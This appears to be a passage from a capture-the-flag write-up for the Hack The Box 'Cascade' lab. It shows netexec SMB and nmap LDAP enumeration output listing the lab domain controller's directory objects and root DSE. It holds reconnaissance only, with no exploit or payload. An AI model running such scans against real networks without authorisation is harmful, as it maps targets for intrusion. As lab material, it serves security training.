+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8105-9ed3-f077d90eb3ec" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ netexec smb 10.10.10.182
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+
+</code></pre><h2 id="18bd1b9f-8847-81b3-a9e5-d521f30b3601" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-81e2-aa3f-f55ca5f46b88" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -T4 -Pn --script &quot;ldap* and not brute&quot; 10.10.10.182
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:38 -05
+Nmap scan report for 10.10.10.182
+Host is up (0.11s latency).
+Not shown: 986 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+| ldap-search: 
+|   Context: DC=cascade,DC=local
+|     dn: DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=cascade,DC=local
+|         instanceType: 5
+|         whenCreated: 2020/01/09 15:31:32 UTC
+|         whenChanged: 2025/01/30 03:03:34 UTC
+|         subRefs: DC=ForestDnsZones,DC=cascade,DC=local
+|         subRefs: DC=DomainDnsZones,DC=cascade,DC=local
+|         subRefs: CN=Configuration,DC=cascade,DC=local
+|         uSNCreated: 4099
+|         uSNChanged: 340052
+|         name: cascade
+|         objectGUID: 6fd3434-bae0-484b-92be-88e4c5926638
+|         creationTime: 133826798143544226
+|         forceLogoff: -9223372036854775808
+|         lockoutDuration: -18000000000
+|         lockOutObservationWindow: -18000000000
+|         lockoutThreshold: 0
+|         maxPwdAge: -9223372036854775808
+|         minPwdAge: 0
+|         minPwdLength: 5
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1001
+|         pwdProperties: 0
+|         pwdHistoryLength: 0
+|         objectSid: 1-5-21-3332504370-1206983947-1165150453
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: \x00\x01
+|         nTMixedDomain: 0
+|         rIDManagerReference: CN=RID Manager$,CN=System,DC=cascade,DC=local
+|         fSMORoleOwner: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|         systemFlags: -1946157056
+|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=cascade,DC=local
+|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=cascade,DC=local
+|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=cascade,DC=local
+|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=cascade,DC=local
+|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=cascade,DC=local
+|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=cascade,DC=local
+|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=cascade,DC=local
+|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=cascade,DC=local
+|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=cascade,DC=local
+|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=cascade,DC=local
+|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=cascade,DC=local
+|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=cascade,DC=local;0]
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=cascade,DC=local
+|         masteredBy: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 4
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|         msDS-IsDomainFor: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|         msDS-NcType: 0
+|         dc: cascade
+|     dn: CN=Users,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Users
+|         description: Default container for upgraded user accounts
+|         distinguishedName: CN=Users,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5696
+|         uSNChanged: 5696
+|         showInAdvancedViewOnly: FALSE
+|         name: Users
+|         objectGUID: d231c67-414-df4d-b413-e4aa7349bc19
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Computers,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Computers
+|         description: Default container for upgraded computer accounts
+|         distinguishedName: CN=Computers,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5697
+|         uSNChanged: 5697
+|         showInAdvancedViewOnly: FALSE
+|         name: Computers
+|         objectGUID: cc859162-1563-fb4f-969a-e073e8e5af24
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: OU=Domain Controllers,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: organizationalUnit
+|         ou: Domain Controllers
+|         description: Default container for domain controllers
+|         distinguishedName: OU=Domain Controllers,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5828
+|         uSNChanged: 5828
+|         showInAdvancedViewOnly: FALSE
+|         name: Domain Controllers
+|         objectGUID: d3dbe943-96bf-cd46-9c8d-390a01eedf
+|         systemFlags: -1946157056
+|         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=cascade,DC=local;0]
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: System
+|         description: Builtin system settings
+|         distinguishedName: CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5698
+|         uSNChanged: 5698
+|         showInAdvancedViewOnly: TRUE
+|         name: System
+|         objectGUID: d2fcd93-e48e-ec4b-8ed0-2350af167525
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=LostAndFound,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: lostAndFound
+|         cn: LostAndFound
+|         description: Default container for orphaned objects
+|         distinguishedName: CN=LostAndFound,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5694
+|         uSNChanged: 5694
+|         showInAdvancedViewOnly: TRUE
+|         name: LostAndFound
+|         objectGUID: be642872-5171-bc48-a0b1-fcfdd23757c
+|         systemFlags: -1946157056
+|         objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Infrastructure,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: infrastructureUpdate
+|         cn: Infrastructure
+|         distinguishedName: CN=Infrastructure,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5829
+|         uSNChanged: 5829
+|         showInAdvancedViewOnly: TRUE
+|         name: Infrastructure
+|         objectGUID: b884327f-f77d-2e4a-988d-4cbf62a21056
+|         fSMORoleOwner: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|         systemFlags: -1946157056
+|         objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=ForeignSecurityPrincipals,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: ForeignSecurityPrincipals
+|         description: Default container for security identifiers (SIDs) associated with objects from external, trusted domains
+|         distinguishedName: CN=ForeignSecurityPrincipals,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5830
+|         uSNChanged: 5830
+|         showInAdvancedViewOnly: FALSE
+|         name: ForeignSecurityPrincipals
+|         objectGUID: cf5ca041-aae5-c746-9342-15c6877cb5d6
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Program Data,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Program Data
+|         description: Default location for storage of application data.
+|         distinguishedName: CN=Program Data,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5831
+|         uSNChanged: 5831
+|         showInAdvancedViewOnly: TRUE
+|         name: Program Data
+|         objectGUID: 6659c410-395a-da40-9994-a8d580f616c3
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Microsoft,CN=Program Data,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Microsoft
+|         description: Default location for storage of Microsoft application data.
+|         distinguishedName: CN=Microsoft,CN=Program Data,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5832
+|         uSNChanged: 5832
+|         showInAdvancedViewOnly: TRUE
+|         name: Microsoft
+|         objectGUID: e05fac4f-55d7-614b-aa62-6166d5825cd
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=NTDS Quotas,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: msDS-QuotaContainer
+|         cn: NTDS Quotas
+|         description: Quota specifications container
+|         distinguishedName: CN=NTDS Quotas,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5833
+|         uSNChanged: 5833
+|         showInAdvancedViewOnly: TRUE
+|         name: NTDS Quotas
+|         objectGUID: 1f7ccf3-be2f-b24b-8b6f-eddb305bfb97
+|         systemFlags: -2147483648
+|         objectCategory: CN=ms-DS-Quota-Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|         msDS-TombstoneQuotaFactor: 100
+|     dn: CN=Managed Service Accounts,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Managed Service Accounts
+|         description: Default container for managed service accounts
+|         distinguishedName: CN=Managed Service Accounts,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5834
+|         uSNChanged: 5834
+|         showInAdvancedViewOnly: FALSE
+|         name: Managed Service Accounts
+|         objectGUID: be185519-f75-1d48-ae3b-88e9ff799d6
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=WinsockServices,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: WinsockServices
+|         distinguishedName: CN=WinsockServices,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5699
+|         uSNChanged: 5699
+|         showInAdvancedViewOnly: TRUE
+|         name: WinsockServices
+|         objectGUID: 95dbb151-af1d-4f40-a567-38aaa2ef81b9
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=RpcServices,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         objectClass: rpcContainer
+|         cn: RpcServices
+|         distinguishedName: CN=RpcServices,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5700
+|         uSNChanged: 5700
+|         showInAdvancedViewOnly: TRUE
+|         name: RpcServices
+|         objectGUID: d7e7f245-e46b-484e-b82d-1e645d80244c
+|         systemFlags: -1946157056
+|         objectCategory: CN=Rpc-Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=FileLinks,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: fileLinkTracking
+|         cn: FileLinks
+|         distinguishedName: CN=FileLinks,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5701
+|         uSNChanged: 5701
+|         showInAdvancedViewOnly: TRUE
+|         name: FileLinks
+|         objectGUID: 298223b7-e113-e642-a2ce-d3e416e4bcf3
+|         systemFlags: -1946157056
+|         objectCategory: CN=File-Link-Tracking,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=cascade,DC=local
+|     dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: fileLinkTracking
+|         objectClass: linkTrackObjectMoveTable
+|         cn: ObjectMoveTable
+|         distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5703
+|         uSNChanged: 5703
+|         showInAdvancedViewOnly: TRUE
+|         name: ObjectMoveTable
+|         objectGUID: 2615f8f3-18c-f04c-84bd-a592a8b5d8e6
+|         systemFlags: -1946157056
+|         objectCategory: CN=Link-Track-Object-Move-Table,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Default Domain Policy,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: leaf
+|         objectClass: domainPolicy
+|         cn: Default Domain Policy
+|         distinguishedName: CN=Default Domain Policy,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5704
+|         uSNChanged: 5704
+|         showInAdvancedViewOnly: TRUE
+|         name: Default Domain Policy
+|         objectGUID: 12373068-4f1f-e641-b94-51f8c8eda93
+|         objectCategory: CN=Domain-Policy,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: classStore
+|         cn: AppCategories
+|         distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5705
+|         uSNChanged: 5705
+|         showInAdvancedViewOnly: TRUE
+|         name: AppCategories
+|         objectGUID: 54b48c16-be8e-564a-a7f0-4b5d7fc930f3
+|         objectCategory: CN=Class-Store,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+|     dn: CN=Meetings,CN=System,DC=cascade,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Meetings
+|         distinguishedName: CN=Meetings,CN=System,DC=cascade,DC=local
+|         instanceType: 4
+|         whenCreated: 2020/01/09 15:31:39 UTC
+|         whenChanged: 2020/01/09 15:31:39 UTC
+|         uSNCreated: 5706
+|         uSNChanged: 5706
+|         showInAdvancedViewOnly: TRUE
+|         name: Meetings
+|         objectGUID: 252c565-13c3-954f-ba18-2af8cf7cebd1
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
+|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
+|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
+|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
+|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
+| 
+| 
+|_Result limited to 20 objects (see ldap.maxobjects)
+| ldap-rootdse: 
+| LDAP Results
+|   &lt;ROOT&gt;
+|       currentTime: 20250130033824.0Z
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cascade,DC=local
+|       dsServiceName: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|       namingContexts: DC=cascade,DC=local
+|       namingContexts: CN=Configuration,DC=cascade,DC=local
+|       namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
+|       namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
+|       namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
+|       defaultNamingContext: DC=cascade,DC=local
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cascade,DC=local
+|       configurationNamingContext: CN=Configuration,DC=cascade,DC=local
+|       rootDomainNamingContext: DC=cascade,DC=local
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       highestCommittedUSN: 340137
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       dnsHostName: CASC-DC1.cascade.local
+|       ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL
+|       serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       isSynchronized: TRUE
+|       isGlobalCatalogReady: TRUE
+|       domainFunctionality: 4
+|       forestFunctionality: 4
+|_      domainControllerFunctionality: 4
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+Service Info: Host: CASC-DC1; OS: Windows 2008 R2
+
+Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
+
